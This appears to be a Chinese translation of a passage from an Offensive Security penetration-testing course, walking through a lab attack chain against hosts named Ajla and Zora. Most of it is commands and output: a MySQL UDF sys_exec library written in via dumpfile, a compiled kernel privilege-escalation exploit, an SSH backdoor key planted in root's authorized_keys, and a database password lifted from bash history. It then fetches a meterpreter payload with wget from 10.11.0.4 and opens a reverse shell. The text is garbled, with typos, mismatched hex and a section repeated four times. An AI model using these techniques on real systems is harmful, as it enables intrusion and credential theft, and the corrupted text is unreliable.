+漏洞数据库条目733 以及注释底部的说明提到了看起来非常有前景的 GitHub 项目734。
+
+让我们下载代码、审查代码并编译它。
+
+```bash
+kali@kali:~$ git clone https://github.com/mysqldf/lib_mysqlqldf_sys.git
+
+Cloning into 'lib_mysqlqldf_sys'...
+
+Done...
+```
+
+```bash
+kali@kali:~$ cd lib_mysqlqldf_sys/
+kali@kali:~/lib_mysqlqldf_sys$
+```
+
+列表 909 - 从 GitHub 下载代码
+
+打开 `lib_mysqlqldf_sys.c` 文件，它显示了一个相当标准的 UDF 库，该库允许 C/C++ 系统函数执行系统命令。735
+
+```c
+my_ulong sys_exec(
+    UDF_INIT *init
+    UDF_ARGS *args
+    char *is_null
+    char *error
+{
+    return system(args->args[0]);
+}
+```
+
+列表 910 - `sys_exec` UDF 函数实现
+
+此外，根据代码，编译后共享库导出的函数与上一个示例一样，是 `sys_exec`。我们需要在数据库中创建一个同名的 MySQL 函数，以便在数据库中执行系统命令。
+
+现在我们已经审查了代码，将开始编译共享库。
+
+查看 `install.sh` 文件，作为编译的决条件，我们需要安装 `libmysqlclient15-dev`。在 Kali Linux 中，这是默认的 `lib-mysqlclient-dev` 包，可以通过 `apt` 安装。
+
+```bash
+kali@kali:~/lib_mysqlqldf_sys$ sudo apt update && sudo apt install lib-mysqlclient-dev
+```
+
+列表 911 - 安装依赖项
+
+> 733 (Offensive Security, 2020), https://www.exploit-db.com/exploits/1518
+> 734 (Arnold Jasny, 2013), https://github.com/mysqldf/lib_mysqlqldf_sys
+> 735 (cplusplus, 2019), http://www.cplusplus.com/reference/cstdlib/system/
+
+PWK 2.0 Copyright © Offensive Security Ltd. All rights reserved.
+
+现在我们已经有了依赖项，在生成新文件之前需要删除旧的对象文件。
+
+```bash
+kali@kali:~/lib_mysqlqldf_sys$ rm lib_mysqlqldf_sys.so
+```
+
+列表 912 - 预构建的二进制文件
+
+查看 `Makefile`，我们需要对它进行一些调整以确保可以编译源文件。
+
+```makefile
+LIBDIR=/usr/lib
+install:
+	gcc -I/usr/include/mysql -I. -shared libmysqlqldf_sys.c -o $(LIBDIR)/libmysqlqldf_sys.so
+```
+
+列表 913 - UDF 库
+
+我们需要调整包含目录，因为我们使用的是 MariaDB 而不是 MySQL。`Makefile` 中的更改见列表 914。
+
+```bash
+kali@kali:~/lib_mysqlqldf_sys$ cat Makefile
+LIBDIR=/usr/lib
+install:
+	gcc -I/usr/include/mariadb/server -I/usr/include/mariadb/ -I/usr/include/mariadb/server/private -I. -shared libmysqlqldf_sys.c -o libmysqlqldf_sys.so
+```
+
+```bash
+kali@kali:~/lib_mysqlqldf_sys$ make
+gcc -I/usr/include/mariadb/server -I/usr/include/mariadb/ -I/usr/include/mariadb/server/private -I. -shared libmysqlqldf_sys.c -o libmysqlqldf_sys.so
+```
+
+列表 914 - 编译 UDF 库
+
+`-Wall` 标志启用所有 gcc 警告，`-I` 指定 MariaDB 的头文件目录。最后，`-o` 告诉 gcc 将文件输出到哪里。`-shared` 标志生成共享库和对象文件。回想 UDF 利用程序的命令，为了将库传输到目标数据库，我们使用文件作为十六进制转。
+
+```sql
+select @plugin_dir;
+
+select binary 0xshellcode into dumpfile@plugin_dir;
+
+create function sys_exec returns int name udf filename;
+
+select * from mysql.func where name='sys_exec' \
+
+select sys_exec('/bin/sh;/tmp/sh; chmod root:/tmp/sh; chmod +s /tmp/sh');
+```
+
+列表 915 - MySQL 利用程序的分解
+
+为此使用以下命令：
+
+```bash
+kali@kali:~/lib_mysqlqldf_sys$ xxd -p libmysqldf_sys.so -d '\n' > libmysqldf_sys.hex
+```
+
+列表 916 - 创建库的十六进制转
+
+`xxd` 命令用于制作十六进制转，`-p` 标志输出纯十六进制转，这便于进一步操作。我们使用 `tr` 删除换行符并将输出内容导出到名为 `libmysqldf_sys.hex` 的文件中。
+
+`libmysqldf_sys.hex` 文件的内容将用于 shellcode。
+
+我们已经有了利用 Zora 所需的一切。现在只需要将其组合在一起。在运行恶意 SQL 命令之前，我们将在 MariaDB 中为 shellcode 创建一个变量。该变量的内容来自 `libmysqldf_sys.hex` 文件。
+
+```sql
+MariaDB(()) set @shell=0x77f54c46028010100000000000000003003e00010000000011000000000004000000000000000000e3b0000000000000000000000000004e3b00000090400041c1b0000000000000000...
+```
+
+列表 917 - 创建 64 位 shellcode 变量
+
+注意 shellcode 前加上 "0x"且缺少单引号或双引号。对于 MariaDB 将文本读取为二进制是必要的。接下来，根据利用程序的指令，我们将确认插件目录的位置。
+
+```MariaDB(()) select @plugin_dir;
+
+| @plugin_dir |
+| /home/dev/plugin/ |
+| 1 row set (0.072 sec) |
+```
+
+
+
+### 列表 918 - 验证 plugin_dir
+
+如所预期，插件目录位于 `/home/dev/plugin/`。接下来我们需要将 shellcode 输出到 Zora 上的一个文件。利用程序生成随机文件名，但我们可以为它任意命名。命令是将其输出到 `/home/dev/plugin/udf_sys_exec.so` 文件。
+
+```MariaDB(()) select binary @shell into dumpfile '/home/dev/plugin/udf_sys_exec.so';
+
+ERROR 1045: Access denied for user 'wp'@'%' (using password: YES)
+
+MariaDB(())
+```
+
+### 列表 919 - 将 shell 转储到文件
+
+不幸的是，我们在这里遇到了我们的第一个问题。根据上面的错误信息，`wp` 用户没有创建文件的权限。为了转储 `dumpfile`，我们需要一个更高权限的账户，例如 `root` 用户。没有这个，我们就被住了，无法通过当前方法继续利用 Zora。脑海中出现的第一个逻辑选项是回到 Ajax 看看我们是否能找到 root（或类似的）MariaDB 凭据。
+
+## 24.3.2.2 我们失败了
+
+虽然用户拥有 `SELECT`、`INSERT`、`UPDATE` 和 `DELETE` 权限，但 `wp` 用户缺少运行 `dumpfile` 所需的 `FILE` 权限。为了转储 `dumpfile`，我们需要一个更高权限的账户，例如 `root` 用户。没有这个，我们就被住了，无法通过当前方法继续利用 Zora。
+
+## 24.4 对 Web 应用服务器进行深度枚举
+
+在本次枚举过程中，我们的目标是寻找能够让我们获得更高权限访问 Zora 的 MariaDB 服务器的方法。虽然我们可以继续使用当前的 user-data 继续对 Ajla 进行枚举，但我们认为更高水平的权限将非常有帮助。这就是为什么我们将枚举精力集中在权限提升上，并将转向寻找凭据。为了寻找权限提升的向量，我们需要回到在 Ajla 上的 Meterpreter Shell。
+
+### 24.4.1 更详尽的后渗透利用
+
+之前，我们了解到 Ajla 运行在 Ubuntu 16.04 上，这是一个相当新的版本。这意味着发现内核漏洞的机会会比旧版本更小。然而，我们不应该完全排除这种可能性。
+
+在枚举运行中的进程、系统服务和已安装的应用后，我们发现除了 Wordpress 之外，该安装似乎只运行了默认的服务和应用程序。这看起来并不乐观。为了完成对应用程序和服务的评估，我们运行 `netstat` 来确定还有哪些端口可能是开启的。
+
+```
+meterpreter > shell
+
+Process 6792 created.
+
+Channel 3 created.
+
+netstat -tulp
+
+(Not all processes could be identified, non-owned process
+will not be shown, you would have to see it in all.)
+
+Active connections (only services)
+Proto Recv Send-Q Local Address Foreign Address State PID/Program name
+tcp 0 0 0.0.0.0:0 0.0.0.0:* LISTEN
+tcp6 0 0 ::: *:* LISTEN
+tcp6 0 0 :::22 ::: *:* LISTEN
+dp 0 0 0.0.0.0:67 0.0.0.0:*
+```
+
+遗憾的是，列表并没有显示出任何有趣的内容。此时，开始寻找内核漏洞是一个好主意意。但首先，我们需要找到目标正在运行的是哪个内核。
+
+```
+uname -a
+Linux ajla 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 GNU/Linux
+```
+
+现在我们已经知道了内核版本，将返回 searchoit。
+
+```
+kali@:- searchoit ubuntu 16.04
+
+Linux Kernel 4.4.0 (Ubuntu 16.04/16.04 x86-64) - 'AF_PA | exploits/linux_x86-64/local/ 
+Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter ta | exploits/linux_x86-64/local/
+Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 16.04/16.04 x8) | exploits/linux/local/41770.c
+Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput(' by ip | exploits/linux/local/39772.t
+Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6GO_SET_REPL' | exploits/linux/local/40849.t
+```
+
+Linux Kernel 4.8 (Ubuntu 16.04) - Leak sctp Kernel Point exploits/linux/dos/45919.c
+Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - exploits/linux/local/45010.c
+Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privi exploits/linux/local/44298.c
+
+### 列表 922 - 在 16.04 中寻找漏洞
+
+虽然许多漏洞似乎有效，但其中一个引起了我们的注意。在查看了 `45010` 的源代码后，我们发现它编写良好，在多个内核版本上通过了测试，并提供了编译和执行的说明。首先，看看 Ajla 是否有 `gcc`。
+
+> 内核版本必须完全匹配漏洞才能工作。在这种情况下，漏洞在内核 4.13.9 上测试过，这比 Ajla 上的内核要新。
+
+```
+gcc
+/bin/sh: 1: gcc not found
+find /name gcc -type f 2>/dev/null
+/usr/share/bash-completion/completions/gcc
+```
+
+### 列表 923 - 尝试在 Ajla 上定位 GCC
+
+遗憾的是，Ajla 没有在 Kali 机器上安装 `gcc`。将其传输到 Ajla 并希望它有效。或者，如果必要，我们可以创建一个与目标系统操作系统和内核版本相同的虚拟机，并在上面编译漏洞。
+
+### 24.4.2 权限提升
+
+首先，我们将漏洞拷贝到主目录，以免删除原始文件。一旦完成，我们将按照文件中的指令操作：
+
+```
+kali@kali:~$ cp /usr/share/exploitdb/linux/local/45010.c ~
+kali@kali:~$ gcc 45010.c -o 45010
+kali@kali:~$
+```
+
+### 列表 924 - 编译漏洞
+
+漏洞编译成功。使用 `meterpreter` 将上传到 Ajla。
+
+```
+meterpreter > upload /home/kali/45010 -> /tmp/
+[*] uploading : /home/kali/45010 -> /tmp/
+[*] uploaded : /home/kali/45010 -> /tmp/
+```
+
+### 列表 925 - 上传漏洞
+
+最后，是时候在 Ajla 上运行漏洞。
+
+```
+meterpreter > shell
+Process 1546 created.
+Channel 5 created.
+cd /tmp
+chmod +x 45010
+./whoami
+```
+
+### 列表 926 - 运行漏洞
+
+在 Listing 926 中，漏洞没有给出输出，但运行 `whoami` 告诉我们是 `root`。现在我们有了 `root` 权限，可以使用 `ssh` 创建一个稳定的后门。这将允许我们在会话死亡后返回 Ajla。首先，我们需要在 Kali 机器上生成一个新的 `ssh` key。
+
+> 如果你已经有了密钥，可以跳过此步骤。
+
+```
+kali@kali:~$ ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which save the key (/home/kali/.ssh/id_rsa):
+Enter passphrase (empty for no):
+Enter passphrase again:
+Your identification has been saved in /home/kali/.ssh/id_rsa.
+```
+
+
+
+Your public key has been saved in `/home/kali/.ssh/id_rsa.pub`.
+
+```
+```
+
+`kali@kali:~$` `cat ~/.ssh/id_rsa.pub`
+
+`ssh-rsa AAAAB3NC... kali@kali`
+
+```
+
+### Listing 927 - 在 Kali 上生成 SSH key
+
+有了生成的密钥，我们可以使用 Ajla 上的 `authorized_keys` 文件来接受我们的公钥。我们将使用拥有 `root` 权限的会话执行此操作。
+
+```
+mkdir /root/.ssh
+
+echo "ssh-rsa AAAAB3NC... kali@kali" > /root/.ssh/authorized_keys
+```
+
+现在在 Kali 上使用 `ssh` 客户端连接到 Ajla。
+
+```
+kali@kali:~$ ssh root@sandbox.box
+
+Welcome to Ubuntu 16.04 LTS (GNU/Linux 4.4.0-21-generic x86_64)
+
+...
+```
+
+```
+
+root@ajla:-
+
+```
+
+### Listing 929 - 使用 ssh 登录 Ajla
+
+## 寻找数据库凭据
+
+寻找凭据时，我们要像管理员或开发者一样思考。你会在哪里存储凭据？凭据是如何使用的？是否存在可能意外保存凭据的历史或日志文件？
+
+例如，服务器用户误在用户名字段输入密码，这可能会记录在 `/var/log/auth.log` 中。让我们从管理员的角度考虑，查看可能包含信息的位置。
+
+我们首先查看 `/etc/passwd`、`/etc/group` 和 `/etc/shadow`，以了解有多少用户和组可以访问目标系统。
+
+然而，唯一有用信息是存在名为 "`ajla`" 的用户。检查用户的 `ajla` 目录看看能找到什么。
+
+```
+root@ajla:~ cd /home/ajla
+
+root@ajla:/home/ajla# ls -alh
+
+total 32K
+
+drwxr-xr-x 3 ajla 4.0K Oct 10 16:37 .bash_history
+
+drwxr-xr-x 3 ajla 4.0K Oct 10 16:22 ..
+
+-rw-r--r-- 1 ajla 15B Dec 10 16:48 .bash_history
+
+-rw-r--r-- 1 ajla 220B Oct 15 17:49 .bash_logout
+
+-rw-r--r-- 1 ajla 376B Oct 15 17 .bashrc
+
+drwx------ 2 ajla 4.0K Oct 15 17:52 .cache
+
+-rw-r--r-- 1 ajla 675B Oct 15 17:49 .profile
+
+-rw-r--r-- 1 ajla 0B Oct 15 17:57 .sudo_admin_successful
+```
+
+### Listing 930 - 查看 Ajla 的主目录
+
+我们没有在主目录中发现什么，但让我们看看 `.bash_history` 了解他们做了什么。
+
+```
+root@ajla:/home/ajla# cat ./.bash_history
+
+sudo password
+```
+
+### Listing 931 - 查看 Ajla 的 .bash_history
+
+这很有趣。空的历史文件意味着该账户并不经常使用。服务器可能被管理过，但我们没有在系统中看到其他其他用户。让我们检查 `root` 用户的历史。
+
+```
+root@ajla:/home/ajla# cat ./.bash_history
+
+pwd
+
+ls
+
+cd /var/log/apache2/
+
+tail -f error.log
+
+tail -f access.log
+
+mysql -u root -p8mDu9xUHKe3fZ3iZ7RdhMeb -h 10.5.5.11 -e 'DROP DATABASE wordpress;'
+
+cd /etc/mysql/
+
+cd
+
+cd -
+
+ls
+
+ls -alh
+
+exit
+```
+
+# 攻击性安全
+
+使用 Kali Linux 2.0 进行渗透测试
+
+`exit`
+`root@ajla:/home/ajla#`
+
+> 列表 932 - 查看 root 用户的历史记录
+
+太棒了，`root` 用户曾管理 Ajla，在某个时刻，使用 MySQL 客户端删除了名为 "`database`" 的数据库。对我们来说，密码和用户直接输入在命令行中了！
+
+## 24.5 再次针对数据库
+
+现在我们有了 Zara MariaDB 实例的 `root` 凭据。让我们回去，使用这些新的、更高权限的权限尝试 UDF 漏洞。
+
+### 24.5.1 漏洞利用
+
+提醒一下，我们在列表 933 中找到的 MariaDB 实例上尝试运行的五条命令。
+
+```
+select @plugin_dir;
+
+select binary 0xshellcode into dumpfile @plugin_dir;
+
+create function sys_exec returns soname udf_filename;
+
+select * from mysql.func where name='sys_exec';
+
+select sys_exec('cp /bin/sh /tmp/sh; chown root /tmp/sh; chmod +s /tmp/sh')
+```
+
+> 列表 933 - MySQL 漏洞拆解
+
+首先，我们将使用之前在 Ajla 上发现并生成的客户端运行 MariaDB 客户端。
+
+```
+kali@kali:~$ mysql --host=127.0.0.1 --port=13306 --user=root -p
+
+Enter password:
+```
+
+输入 `'help'` 或 `'\h'` 获取帮助。输入 `'\c'` 清空当前输入语句。
+
+> MariaDB [(none)] - 运行 MariaDB 客户端
+
+接下来，我们将 `shell` 变量设置为我们生成的那个。
+
+```
+MariaDB [(none)]> set shell = 0x7f454c460210000000000000000000000003e00100000000011000000000040000000000000000e3b0000000000000000400308000940004001c1b0010000000400000000000000000000000;
+```
+
+> 列表 935 - 创建一个 64 位 shell 变量
+
+通过 `set shell` 命令，我们再次验证目录已设置为 `/home/dev/plugin`。如果这对于流程不是必须的，那么确保没有发生变化也是好主意。
+
+```
+MariaDB [(none)]> select @plugin_dir;
+```
+
+| @plugin_dir |
+| :--- |
+| /home/dev/plugin/ |
+| 1 row in set (0.072) |
+
+PWK 2.0
+
+Copyright © Offensive Security Ltd. All rights reserved.
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+### 列表 936 - 验证 plugin_dir
+
+现在是见真情的时刻。让我们尝试将二进制文件导出到文件中。
+
+```
+MariaDB [(none)] select binary @shell into dumpfile '/home/dev/udf_sys_exec.so';
+
+Query OK, 1 row affected (0.078 sec)
+```
+
+### 列表 937 - 将 shell 导出到文件
+
+成功了！在我们开始之前，我们还需要创建一个函数。
+
+```
+MariaDB [(none)] create function sys_exec returns soname 'udf_sys_exec.so';
+
+Query OK, 0 rows affected (0.78 sec)
+```
+
+### 列表 938 - 创建 UDF
+
+MariaDB 没有给我们提供任何错误，这让我们相信函数已创建。我们可以通过运行查询 `sys_exec` 的命令进行双重检查。
+
+```
+MariaDB [(none)] select * from mysql.func where name='sys_exec';
+
+| name | ret | type |
+| :--- | :--- | :--- |
+| sys_exec | 2 | udf_sys_exec.so |
+```
+(0.0072 sec)
+
+### 列表 939 - 验证 UDF
+
+现在让我们通过尝试从 Zora 向我们的 Kali 发起网络调用来测试 `sys_exec` 是否工作。为了实现这一点，我们在端口 `80` 上启动服务器并向我们的 Kali 发起 `sys_exec` UDF 调用。
+
+```
+kali@kali:~$ sudo python3 -m http.server 80
+
+Serving HTTP on 0.0.0.0:80 ...
+```
+
+
+
+> 列表 940 - 在 Kali 上启动 web 服务器
+
+现在已经启动，我们可以进行 `sys_exec` UDF 调用。函数的语法可以在原始 UDF 漏洞中找到。
+
+```
+MariaDB [(none)] select sys_exec('wget http://10.11.0.4');
+```
+
+| sys_exec('wget http://10.11.0.4') |
+| :--- |
+| 256 |
+
+```
+| 1 row in set (0.230 sec)
+```
+
+> 列表 941 - 在我们的 web 服务器中运行 wget
+
+如果命令有效，我们将在 web 服务器中看到日志。
+
+```
+Serving HTTP on 0.0.0.0:80 ...
+
+[10/Dec/2019 17:49:05] "GET /HTTP/1.1" 200 -
+```
+
+> 列表 942 - 查看 web 服务器日志
+
+成功！我们正在 Zora 上运行代码。
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+现在我们可以在 Zora 上上传并执行 meterpreter 负载向我们的 Kali 发送反向 shell。我们不需要为 Ajla 生成新的 meterpreter shell，因为我们现在通过标准连接到 Ajla，可以使用 Kali 的端口 443 进行 meterpreter。首先，让 Zora 下载。
+
+```
+MariaDB [(none)]> select sys_exec('wget http://10.11.0.4/shell.elf');
+```
+
+| sys_exec('wget http://10.11.0.4/shell.elf') |
+| :--- |
+| 0 |
+
+```
+| 1 row in set (0.026)
+```
+
+> 列表 943 - 通过 UDF 下载 shell
+
+meterpreter 下载后，我们需要使文件具有可执行权限。
+
+```
+MariaDB [(none)]> select sys_exec('chmod x ./shell.elf');
+```
+
+| sys_exec('chmod x ./shell.elf') |
+| :--- |
+| 0 |
+
+```
+| 1 row in set (0.074 sec)
+```
+
+> 列表 944 - 使 meterpreter 可执行
+
+现在 shell 已经是可执行的，让我们在 Kali 上重启 msconsole 以获得全新的环境。
+
+```
+exploit(multi/handler) > exit
+kali@kali:~$ sudo msconsole -q "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set HOST 10.11.0.4; set PORT 443; run"
+```
+
+```
+[+] Started reverse TCP handler on 10.11.0.4:443
+```
+
+> 列表 945 - 启动 msconsole 配置 UDF 反向 shell
+
+随着监听器的配置并运行，我们可以在 Zora 上执行 shell。
+
+```
+MariaDB [(none)]> select sys_exec('./shell.elf');
+```
+
+> 列表 946 - 运行 shell
+
+```
+[+] Started reverse TCP handler on 10.11.0.4:443
+[*] Sending stage (985320 bytes) to 10.11.1.250
+[*] Meterpreter session 1 opened (10.11.0.4:443 -> 10.11.1.250:27904) at 18:00:32
+```
+
+```
+meterpreter > shell
+Process 3972 created.
+Channel 1 created.
+```
+
+```
+whoami
+mysql
+```
+
+PWK 2.0 | Copyright © Offensive Security Ltd. All rights reserved.
+
+> 列表 947 - 捕获 shell
+
+太棒了，我们在 Zora 上获得了一个可用的 shell！
+
+## 24.5.1.1 练习
+
+- 修改原始 Python 漏洞并捕获反向 shell。
+- 原始 UDF 漏洞宣传为权限提升漏洞。为什么我们获得的是无权限 shell？
+
+## 24.5.2 渗透后枚举
+
+现在我们已经在 Zora 上有了 shell，让我们收集一些关于主机的通用信息看看我们可以学到什么。让我们从检查运行的 Linux 版本开始。
+
+```
+meterpreter > shell
+Process 4469 created.
+Channel 2 created.
+cat /etc/issue
+Welcome to Alpine Linux 3.10
+Kernel x86_64 on l
+```
+
+> 列表 948 - 查看 `/etc/issue`
+
+快速搜索显示 Alpine Linux 是“基于 musl libc 和 busybox 的面向安全的轻量级发行版”。这很有用，因为预计此操作系统不会运行许多服务或应用程序。任何异常的东西可能是很好的目标。让我们继续收集信息。
+
+```
+cat /proc/version
+Linux version 4.19.78-0-virt (buildozer/build-3-10-x86_64) (gcc version 8.3.0 (Alpine 8.3.0)) #1-Alpine SMP Thu Oct 10 15:25:30 UTC 2019
+```
+
+> 列表 949 - 查找内核版本
+
+`/proc/version` 告诉我们日期是在 2019 年 10 月构建的。除此之外，我们可以记录内核版本并继续进行。
+
+让我们看看环境变量。
+
+```
+env
+USER=mysql
+SHLV=1
+HOME=/var/lib/mysql
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/system/bin:/system/sbin
+LANG=C
+PWD=/var/lib/mysql
+```
+
+> 列表 950 - 查找环境变量
+
+# 攻击性安全
+
+遗憾的是，环境变量并没有告诉我们太多信息。查看 `ps aux` 的输出也没有揭示任何关于我们能检测到什么的信息。让我们运行 `netstat` 看看我们是否有访问未从沙盒外部网络暴露的端口。
+
+```
+netstat -tulpn
+netstat: showing only processes with your user ID
+Active Internet connections (only servers)
+Proto Recv-Q Send Address Foreign Address State PID/Program name
+tcp 0 0 0.0.0.0:0 0.0.0.0:* LISTEN
+tcp 0 0 0.0.0.0:3360 0.0.0.0:* LISTEN
+tcp 0 0 ::::* LISTEN
+udp 0 0 127.0.0.1:1323 :::*
+udp 0 0 :::: **
+```
+
+与正在运行的服务类似，开放的端口没有为我们提供任何信息。让我们检查文件系统是什么样的。
+
+```bash
+cat /etc/fstab
+uuid=e22fd7f4-f23a-441c-bc4b-15694837ef33
+uuid=8e53c417-9437-45a4-953d-c0c350b6f62
+uuid=e6d0b6d1-a3c8-45f8-b5ec-f8e1529ba4e6 ext4 rw,relime 1
+ext4 swap rw,relime 2
+ext4 swap swap defaults
+/dev/cdrom /media/cdrom vfat noat 0 0
+/dev/usbdisk /media/usb vfat noat 0 0
+/10.5.5.20/Scripts /mnt/scripts cifs uid=0,gid=0,username=,password=_netdev 0
+```
+
+`/etc/fstab` 的内容很有趣。从 `10.5.5.20` 主机挂载了一个共享。让我们探测一下这些共享，看看我们能发现什么。
+
+```bash
+cd /mnt/scripts
+ls
+naz_setup.yml
+olduser_lookup.ps1
+system_report.ps1
+temp_folder_cleanup.bat
+```
+
+```powershell
+cat system_report.ps1
+# 寻找更好的方法来自动化此
+username = "sandbox\alex"
+$pwdTxt = "Nadw+roookc+haZ"
+```
+
+
+
+```powershell
+$securePw = $pwdTxt | ConvertTo-SecureString
+
+$sCred = New-Object System.Management.Automation.PSCredential -ArgumentList $user
+
+name=$securePw
+```
+
+# 在 Poultry 上启用远程管理
+
+```powershell
+$remoteKeyParams = @{
+ComputerName = "POULTRY"
+Path = 'HKLM:\SOFTWARE\Microsoft\WebManagement\Server'
+Name = 'EnableRemoteManagement'
+Value = '1'
+}
+```
+
+```powershell
+Set-RemoteRegistryValue @remoteKeyParams -Credential $sCred
+```
+
+# 停止最近运行的进程进程
+
+## 使用 Kali Linux 2.0 进行渗透测试
+
+```powershell
+Stop-Process -processname calc
+```
+
+### 列表 953 - 审查脚本
+
+我们在 `system_report.ps1` 文件中发现了一组据。用户名是 'sandboxalex'，密码是 'Ndaw*nRoqC+haZ'。我们似乎还发现了脚本安装的目标机器名称 'Poultry'。考虑到此目录下脚本的类型，并考虑到用户似乎是 'sandbox' 域的一部分，我们可能正在看一台 Windows 计算机。
+
+> 将你发现的脚本下载并保存在你的笔记中是一个好习惯。你永远不知道某些东西何时会被删除，或者客户何时会要求更多证据。
+
+## 24.5.3 创建一个稳定的反向隧道
+
+类似于我们通过 `www-data` 用户获得 Ajla 的无权限 shell 访问时，我们无法为 Zora 使用 mysql 用户进行标准的 ssh 连接，因为该用户默认没有 shell 访问权限。
+
+虽然我们可以创建一个类似于在 Ajla 上使用的 ssh 隧道，但还有另一个选项，我们设置 Zora 运行着最新版本的 Alpine。较新版本的 ssh 客户端允许我们建立一种非常实用的用于动态端口转发的反向隧道。
+
+```bash
+ssh -V
+OpenSSH_8.1p1, OpenSSH_1.1d1 10 Sep 2019
+```
+
+### 列表 954 - 检查 ssh 版本
+
+Zora 运行着 OpenSSH_8.1p1，它应该支持此功能。如果我们能让它工作，我们就可以通过在我们的 Kali 上运行的 SOCKS 代理获得对 10.5.0/24 内部网络的完全网络访问。由于我们只有访问 met，我们需要在 Zora 上创建一个新的 ssh key。首先，让我们在 Zora 上生成一个 ssh key。
+
+```bash
+ssh-keygen
+Generating public key pair.
+Enter file in which to save the key (/var/lib/ssh/id_rsa):
+Enter passphrase (empty for no):
+Enter passphrase again:
+Created key /var/lib/ssh/id_rsa
+Public key has been saved in /var/lib/ssh/id_rsa.pub.
+```
+
+```bash
+ssh-rsa AAAAB3Nzac2EAAAABQQC4c...
+```
+
+### 列表 955 - 生成 SSH 密钥
+
+PWK 2.0
+Copyright © Offensive Security Ltd. All rights reserved.
+
+## 使用 Kali 进行渗透测试 2.0
+
+通过 `www-data` 用户获得 Ajla 的无权限 shell 访问时，我们无法使用 mysql 用户为 Zora 使用标准的 ssh 连接，因为该用户默认没有 shell 访问权限。
+
+虽然我们可以创建一个类似于在 Ajla 上使用的 ssh 隧道，但还有另一个选项，我们设置 Zora 运行着最新版本的 Alpine。较新版本的 ssh 客户端允许我们建立一种非常实用的用于动态端口转发的反向隧道。
+
+```bash
+ssh -V
+OpenSSH_8.1p1, OpenSSH_1.1d1 10 Sep 2019
+```
+
+### 列表 954 - 检查 ssh 版本
+
+Zora 运行着 OpenSSH_8.1p1，它应该支持此功能。如果我们能让它工作，我们就可以通过在我们的 Kali 上运行的 SOCKS 代理获得对 10.5.0/24 内部网络的完全网络访问。由于我们只有访问 met，我们需要在 Zora 上创建一个新的 ssh key。首先，让我们在 Zora 上生成一个 ssh key。
+
+```bash
+ssh-keygen
+Generating public key pair.
+Enter file in which to save the key (/var/lib/ssh/id_rsa):
+Enter passphrase (empty for no):
+Enter passphrase again:
+Created key /var/lib/ssh/id_rsa
+Public key has been saved in /var/lib/ssh/id_rsa.pub.
+```
+
+```bash
+ssh-rsa AAAAB3Nzac2EAAAABQQC4c...
+```
+
+### 列表 955 - 生成 SSH 密钥
+
+PWK 2.0
+Copyright © Offensive Security Ltd. All rights reserved.
+
+## 使用 Kali 进行渗透测试 2.0
+
+通过 `www-data` 用户获得 Ajla 的无权限 shell 访问时，我们无法使用 mysql 用户为 Zora 使用标准的 ssh 连接，因为该用户默认没有 shell 访问权限。
+
+虽然我们可以创建一个类似于在 Ajla 上使用的 ssh 隧道，但还有另一个选项，我们设置 Zora 运行着最新版本的 Alpine。较新版本的 ssh 客户端允许我们建立一种非常实用的用于动态端口转发的反向隧道。
+
+```bash
+ssh -V
+OpenSSH_8.1p1, OpenSSH_1.1d1 10 Sep 2019
+```
+
+### 列表 954 - 检查 ssh 版本
+
+Zora 运行 Open OpenSSH_8.1p1，它应该支持此功能。如果我们能让它工作，我们就可以通过在我们的 Kali 上运行的 SOCKS 代理获得对 10.5.0/24 内部网络的完全网络访问。由于我们只有访问 met，我们需要在 Zora 上创建一个新的 ssh key。首先，让我们在 Zora 上生成一个 ssh key。
+
+```bash
+ssh-keygen
+Generating public key pair.
+Enter file in which to save the key (/var/lib/ssh/id_rsa):
+Enter passphrase (empty for no):
+Enter passphrase again:
+Created key /var/lib/ssh/id_rsa
+Public key has been saved in /var/lib/ssh/id_rsa.pub.
+```
+
+```bash
+ssh-rsa AAAAB3Nzac2EAAAABQQC4c...
+```
+
+### 列表 955 - 生成 SSH 密钥
+
+PWK 2.0
+Copyright © Offensive Security Ltd. All rights reserved.
+
+## 使用 Kali 进行渗透测试 2.0
+
+通过 `www-data` 用户获得 Ajla 的无权限 shell 访问时，我们无法使用 mysql 用户为 Zora 使用标准的 ssh 连接，因为该用户默认没有 shell 访问权限。
+
+虽然我们可以创建一个创建一个类似于在 Ajla 上使用的 ssh 隧道，但还有另一个选项，我们设置 Zora 运行着最新版本的 Alpine。较新版本的 ssh 客户端允许我们建立一种非常实用的用于动态端口转发的反向隧道。
+
+```bash
+ssh -V
+OpenSSH_8.1p1, OpenSSH_1.1d1 10 Sep 2019
+```
+
+### 列表 954 - 检查 ssh 版本
+
+Zora 运行着 OpenSSH_8.1p1，它应该支持此功能。如果我们能让它工作，我们就可以通过在我们的 Kali 上运行的 SOCKS 代理获得对 10.5.0/24 内部网络的完全网络访问。由于我们只有访问 met，我们需要在 Zora 上创建一个新的 ssh key。首先，让我们在 Zora 上生成一个 ssh key。
+
+```bash
+ssh-keygen
+Generating public key pair.
+Enter file in which to save the key (/var/lib/ssh/id_rsa):
+Enter passphrase (empty for no):
+
+
+
+## 使用 Kali 进行渗透测试 2.0
+
+通过 `www-data` 用户获得 Ajla 的无权限 shell 访问时，我们无法使用 `mysql` 用户为 Zora 使用标准的 `ssh` 连接，因为该用户默认没有 shell 访问权限。
+
+虽然我们可以创建一个类似于在 Ajla 上使用的 `ssh` 隧道，但还有另一个选项，我们设置 Zora 运行着最新版本的 Alpine。较新版本的 `ssh` 客户端允许我们建立一种非常实用的用于动态端口转发的反向隧道。
+
+```
+ssh -V
+OpenSSH_8.1p1, OpenSSH_1.1d1 10 Sep 2019
+```
+
+### 列表 954 - 检查 ssh 版本
+
